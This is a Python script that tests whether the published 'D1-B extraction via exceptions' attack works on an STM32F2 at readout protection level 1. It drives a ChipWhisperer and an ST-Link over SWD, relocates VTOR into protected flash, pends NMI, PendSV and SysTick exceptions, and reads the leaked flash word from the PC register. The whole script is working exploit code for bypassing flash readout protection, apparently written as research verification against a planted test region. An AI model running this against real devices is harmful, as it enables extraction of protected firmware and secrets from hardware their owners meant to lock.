#!/usr/bin/env python
"""d1b_exception_read.py - test Obermaier WOOT'20 "D1-B: Extraction via
Exceptions" on the STM32F2 at RDP1.

Idea (works on genuine STM32F103 at RDP1): at RDP1 with a debugger, flash is
blocked on the DATA bus but NOT the INSTRUCTION bus. Interrupt vector fetches
use the instruction bus, so they succeed. Point VTOR at a flash region, pend an
exception, let the CPU fetch the handler address (a flash word) into PC, and
read PC over SWD. Relocating VTOR sweeps flash. This leaks flash WITHOUT a glitch.

This script only PROVES/DISPROVES the primitive on F2: it leaks a few words from
our planted storage (VTOR=0x08008000) and compares to ground-truth storage.bin.
READ-ONLY: writes only volatile SRAM + core regs + VTOR. No flash, no option
bytes. Safe at RDP1.

If PC == the expected flash word -> D1-B works on F2 (deterministic readout!).
If PC is 0 / 0xFFFFFFFF / unchanged / faults -> F2 blocks the instruction-bus
leak (expected if ST fixed it post-F1); fall back to glitching.
"""
import os, sys, time, glob, fcntl

import chipwhisperer as cw
from swd.stlink import Stlink
from swd.cortexm import CortexM

STORAGE   = 0x08008000
VTOR_REG  = 0xE000ED08
ICSR_REG  = 0xE000ED04
NMIPENDSET = 1 << 31
PENDSVSET  = 1 << 28
PENDSTSET  = 1 << 26
OPTCR     = 0x40023C14
LOOP_ADDR = 0x20000100          # 'b .' thumb loop in SRAM
STACK     = 0x2000FF00          # valid SP in SRAM

# exception number -> (vector offset, ICSR pend bit, name)
EXC = [
    (2,  0x08, NMIPENDSET, 'NMI'),
    (14, 0x38, PENDSVSET,  'PendSV'),
    (15, 0x3C, PENDSTSET,  'SysTick'),
]


def usbreset_stlink():
    """USBDEVFS_RESET the ST-Link (0483:3748) node - fixes Errno 5."""
    USBDEVFS_RESET = (ord('U') << 8) | 20
    for dev in glob.glob('/sys/bus/usb/devices/*'):
        try:
            vid = open(dev + '/idVendor').read().strip()
            pid = open(dev + '/idProduct').read().strip()
        except OSError:
            continue
        if vid == '0483' and pid == '3748':
            busnum = open(dev + '/busnum').read().strip()
            devnum = open(dev + '/devnum').read().strip()
            node = f'/dev/bus/usb/{int(busnum):03d}/{int(devnum):03d}'
            try:
                fd = os.open(node, os.O_WRONLY)
                fcntl.ioctl(fd, USBDEVFS_RESET, 0)
                os.close(fd)
                print(f'[+] USBDEVFS_RESET {node}')
            except OSError as e:
                print(f'[!] reset {node} failed: {e}')
            return


def power_on():
    s = cw.scope()
    s.clock.clkgen_freq = 16e6
    s.io.glitch_hp = False
    s.io.glitch_lp = False
    s.io.tio1 = False            # BOOT0 low (we drive everything via SWD anyway)
    s.io.tio2 = 'high_z'
    s.io.tio4 = 'high_z'         # NRST released
    s.io.target_pwr = False
    time.sleep(0.5)
    s.io.target_pwr = True
    time.sleep(1.0)
    return s


def connect():
    for attempt in range(3):
        try:
            return Stlink(swd_frequency=1800000)
        except Exception as e:
            print(f'[!] SWD connect try {attempt+1}: {type(e).__name__}: {e}')
            usbreset_stlink()
            time.sleep(0.6)
    raise SystemExit('[!] SWD would not come up')


def main():
    gt = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           'storage.bin'), 'rb').read()
    print('[+] powering target (BOOT0 low, crowbar off)')
    scope = power_on()
    st = connect()
    cmx = CortexM(st)
    print(f'[+] SWD up. IDCODE=0x{st.get_idcode():08x}')

    optcr = st.get_mem32(OPTCR)
    rdp = (optcr >> 8) & 0xFF
    lvl = {0xAA: 'RDP0', 0xCC: 'RDP2'}.get(rdp, 'RDP1')
    print(f'[+] OPTCR=0x{optcr:08x} RDP=0x{rdp:02x} -> {lvl}')

    # baseline: direct data-bus flash read (should be BLOCKED at RDP1)
    try:
        w = st.get_mem32(STORAGE)
        print(f'[!] direct flash read @0x{STORAGE:08x} = 0x{w:08x} '
              f'-> NOT blocked (chip at RDP0?!). D1-B test is moot.')
        direct_ok = True
    except Exception as e:
        print(f'[+] direct flash read @0x{STORAGE:08x} BLOCKED '
              f'({type(e).__name__}) - correct for RDP1. Now try the leak.')
        direct_ok = False

    # halt + set a sane CPU context
    cmx.halt()
    print(f'[+] core halted: {cmx.is_halted()}')
    st.set_mem32(LOOP_ADDR, 0xE7FEE7FE)      # 'b .' x2 in SRAM
    st.set_mem32(VTOR_REG, STORAGE)
    got = st.get_mem32(VTOR_REG)
    print(f'[+] VTOR set to 0x{got:08x}')

    print('\n    exc        PC(leaked)   expected    addr          match')
    print('    ------------------------------------------------------------')
    hits = 0
    for excno, off, pend, name in EXC:
        # re-arm sane state each time
        cmx.set_reg('SP', STACK)
        cmx.set_reg('PC', LOOP_ADDR | 1)     # thumb
        cmx.set_reg('PSR', 0x01000000)       # thumb bit in EPSR
        st.set_mem32(ICSR_REG, pend)         # pend the exception
        try:
            cmx.step()                       # step -> take exception entry
            pc = cmx.get_reg('PC')
        except Exception as e:
            print(f'    {name:<8} step/read failed: {type(e).__name__}')
            continue
        exp = int.from_bytes(gt[off:off+4], 'little')
        match = (pc & ~1) == (exp & ~1)
        hits += match
        print(f'    {name:<8}  0x{pc:08x}   0x{exp:08x}  0x{STORAGE+off:08x}   '
              f'{"*** MATCH ***" if match else "no"}')

    print()
    if hits:
        print(f'[VERDICT] D1-B WORKS on this F2: {hits}/{len(EXC)} exception leaks '
              f'returned the correct flash word. Deterministic SWD readout is '
              f'viable - no glitch needed.')
    else:
        print('[VERDICT] D1-B BLOCKED on this F2: no exception leaked the flash '
              'word (instruction-bus vector fetch is protected at RDP1, as ST '
              'likely fixed post-F1). Stay on the glitch path.')

    cmx.run()
    scope.io.target_pwr = False
    scope.dis()
    return 0 if hits else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(1)
